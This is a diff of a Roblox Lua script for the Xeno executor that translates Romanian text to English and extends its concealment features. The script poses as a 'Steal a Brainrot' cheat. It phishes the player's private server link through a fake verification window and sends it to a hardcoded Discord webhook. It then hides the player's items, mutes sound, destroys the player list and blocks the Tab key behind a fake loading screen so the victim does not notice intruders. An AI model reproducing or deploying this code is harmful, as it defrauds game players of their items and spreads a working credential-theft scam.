@@ -1,6 +1,6 @@
--- Script pentru Xeno - Steal a Brainrot (VOID EXTERNAL + Discord)
--- BLOCHEAZĂ ȘI TASTA TAB
--- Compatibil cu Xeno Executor
+-- Script for Xeno - Steal a Brainrot (VOID EXTERNAL + Discord)
+-- FULL ENGLISH + TAB HIDDEN
+-- Compatible with Xeno Executor
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -12,10 +12,10 @@ local SoundService = game:GetService("SoundService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
 
--- ===== CONFIGURARE =====
+-- ===== CONFIG =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
 
--- ===== DISCORD (PENTRU XENO) =====
+-- ===== DISCORD (XENO) =====
 local function sendToDiscord(message)
     local request = syn and syn.request or http_request or request
     if request then
@@ -30,9 +30,9 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== BLOCARE TOTALĂ A SUNETELOR =====
+-- ===== MUTE ALL SOUNDS =====
 local function muteAllSounds()
-    print("🔇 Blochez TOATE sunetele...")
+    print("🔇 Muting ALL sounds...")
     
     pcall(function()
         SoundService.Volume = 0
@@ -61,32 +61,52 @@ local function muteAllSounds()
         end
     end)
     
-    print("✅ TOATE sunetele blocate!")
+    print("✅ ALL sounds muted!")
 end
 
--- ===== BLOCHEAZĂ TASTA TAB =====
-local function blockTab()
+-- ===== HIDE PLAYER LIST (TAB) =====
+local function hidePlayerList()
     pcall(function()
-        -- Ascunde leaderboard-ul
+        -- Destroy ALL leaderboards and player lists
         for _, gui in pairs(CoreGui:GetChildren()) do
-            if gui:IsA("ScreenGui") and (gui.Name:lower():find("leader") or gui.Name:lower():find("player") or gui.Name:lower():find("score") or gui.Name:lower():find("board")) then
-                gui.Enabled = false
-                gui.ResetOnSpawn = false
+            if gui:IsA("ScreenGui") then
+                local name = gui.Name:lower()
+                if name:find("leader") or name:find("player") or name:find("score") or name:find("board") or name:find("stats") or name:find("list") or name:find("scoreboard") then
+                    gui:Destroy()
+                end
             end
         end
         
-        -- Blochează tasta Tab
+        -- Also search in PlayerGui
+        for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") then
+                local name = gui.Name:lower()
+                if name:find("leader") or name:find("player") or name:find("score") or name:find("board") or name:find("stats") or name:find("list") or name:find("scoreboard") then
+                    gui:Destroy()
+                end
+            end
+        end
+        
+        -- Block Tab key completely
         UserInputService.InputBegan:Connect(function(input)
             if input.KeyCode == Enum.KeyCode.Tab then
                 input:StopPropagation()
                 return
             end
         end)
+        
+        -- Also block the key release
+        UserInputService.InputEnded:Connect(function(input)
+            if input.KeyCode == Enum.KeyCode.Tab then
+                input:StopPropagation()
+                return
+            end
+        end)
     end)
-    print("✅ Tasta Tab blocată!")
+    print("✅ Player list hidden! Tab key blocked!")
 end
 
--- ===== ASCUNDE BRAINROT-URILE =====
+-- ===== HIDE BRAINROTS =====
 local function hideBrainrots()
     local count = 0
     local hidden = {}
@@ -112,9 +132,9 @@ local function hideBrainrots()
     return count
 end
 
--- ===== RESETEAZĂ BAZA =====
+-- ===== RESET BASE =====
 local function resetBase()
-    print("🔄 Resetez baza...")
+    print("🔄 Resetting base...")
     
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("Model") and obj.Name and string.find(obj.Name, "_Fake") then
@@ -142,10 +162,10 @@ local function resetBase()
         end
     end)
     
-    print("✅ Baza resetată!")
+    print("✅ Base reset!")
 end
 
--- ===== ASCUNDE DOAR PE TINE =====
+-- ===== HIDE ONLY ME =====
 local function hideMe()
     if Character then
         for _, part in pairs(Character:GetDescendants()) do
@@ -165,7 +185,7 @@ local function hideMe()
     end
 end
 
--- ===== ECAN NEGRU + LOADER STILIZAT (VOID EXTERNAL) =====
+-- ===== BLACK SCREEN + LOADER (VOID EXTERNAL) =====
 local function showLoader()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoaderGUI"
@@ -368,7 +388,7 @@ local function showLoader()
     log3.TextXAlignment = Enum.TextXAlignment.Left
     log3.Parent = screenGui
 
-    -- Procent 61%
+    -- Percent 61% (static)
     local percentBottom = Instance.new("TextLabel")
     percentBottom.Size = UDim2.new(0.9, 0, 0, 25)
     percentBottom.Position = UDim2.new(0.05, 0, 0.89, 0)
@@ -382,7 +402,7 @@ local function showLoader()
 
     screenGui.Parent = CoreGui
 
-    -- ===== ANIMAȚIE LOADER =====
+    -- ===== LOADER ANIMATION =====
     spawn(function()
         local progress = 0
         while progress < 90 do
@@ -446,7 +466,7 @@ local function showLoader()
     return screenGui
 end
 
--- ===== GUI CU LINK =====
+-- ===== LINK GUI (ENGLISH) =====
 local function showLinkGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "LinkInput"
@@ -474,7 +494,7 @@ local function showLinkGUI()
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 45)
     title.Position = UDim2.new(0, 0, 0, 0)
-    title.Text = "🔐 VERIFICARE SERVER"
+    title.Text = "🔐 SERVER VERIFICATION"
     title.TextColor3 = Color3.fromRGB(180, 120, 255)
     title.BackgroundTransparency = 1
     title.Font = Enum.Font.GothamBold
@@ -484,7 +504,7 @@ local function showLinkGUI()
     local subtitle = Instance.new("TextLabel")
     subtitle.Size = UDim2.new(1, 0, 0, 25)
     subtitle.Position = UDim2.new(0, 0, 0.20, 0)
-    subtitle.Text = "Introdu link-ul serverului privat:"
+    subtitle.Text = "Enter the private server link:"
     subtitle.TextColor3 = Color3.fromRGB(180, 180, 200)
     subtitle.BackgroundTransparency = 1
     subtitle.Font = Enum.Font.Gotham
@@ -506,7 +526,7 @@ local function showLinkGUI()
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(0.9, 0, 0, 40)
     btn.Position = UDim2.new(0.05, 0, 0.60, 0)
-    btn.Text = "📤 AUTENTIFICARE"
+    btn.Text = "📤 AUTHENTICATE"
     btn.BackgroundColor3 = Color3.fromRGB(180, 120, 255)
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.Font = Enum.Font.GothamBold
@@ -514,14 +534,14 @@ local function showLinkGUI()
     btn.Parent = frame
     btn.MouseButton1Click:Connect(function()
         if textBox.Text and textBox.Text ~= "" then
-            sendToDiscord("**🔗 LINK SERVER PRIVAT**\n\n📌 **Player:** " .. LocalPlayer.Name .. "\n🔗 **Link:** " .. textBox.Text)
+            sendToDiscord("**🔗 PRIVATE SERVER LINK**\n\n📌 **Player:** " .. LocalPlayer.Name .. "\n🔗 **Link:** " .. textBox.Text)
             gui:Destroy()
             showLoader()
             hideMe()
             muteAllSounds()
-            blockTab()  -- <-- BLOCHEAZĂ TASTA TAB
+            hidePlayerList()
             local count = hideBrainrots()
-            print("✅ Script activ! " .. count .. " brainrot-uri ascunse.")
+            print("✅ Script active! " .. count .. " brainrots hidden.")
             
             spawn(function()
                 while true do
@@ -538,9 +558,9 @@ end
 -- ===== MAIN =====
 local function main()
     showLinkGUI()
-    print("🚀 Așteaptă introducerea link-ului...")
-    print("🔄 Baza se va reseta automat la fiecare 5 secunde.")
-    print("🔒 Tasta Tab a fost blocată!")
+    print("🚀 Waiting for link input...")
+    print("🔄 Base will reset every 5 seconds.")
+    print("🔒 Tab key blocked! Player list hidden!")
 end
 
 -- ===== START =====
